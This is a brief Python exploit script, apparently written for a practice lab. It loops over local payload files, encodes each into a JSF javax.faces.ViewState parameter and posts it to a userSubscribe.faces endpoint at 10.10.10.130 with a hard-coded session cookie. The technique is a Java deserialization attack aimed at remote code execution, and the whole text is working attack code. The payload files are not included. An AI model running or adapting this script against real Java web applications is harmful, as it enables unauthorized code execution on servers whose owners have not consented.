#!/usr/bin/python3

import requests
from os import listdir
import jdeserializer as j

url = 'http://10.10.10.130:8080/userSubscribe.faces'

headers = { 'user-agent': 'I fucking hate java',
            'Host': '10.10.10.130:8080',
            }

cookies = { 'JSESSIONID': 'AD46EA302B9AB191DD7FE6629BDC4B21' }

filenames = listdir('.')

payloads = []

for filename in filenames:
    if "payload" in filename:
        payloads.append(filename)


for payload in payloads:
    with open('./%s' % payload, 'rb') as f:
        contents = f.read()

    print("Trying payload: %s" % payload)
    
    enc = j.craft(contents)

    print("params:")

    params = { 'j_id_jsp_1623871077_1:email': 'agr0',
               'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
               'j_id_jsp_1623871077_1_SUBMIT': 1,  
               'javax.faces.ViewState': enc }

    print(params)

    print("Sending data...")
    r = requests.post(url, params, headers=headers, cookies=cookies)
    print("Status: %s" % r.status_code)

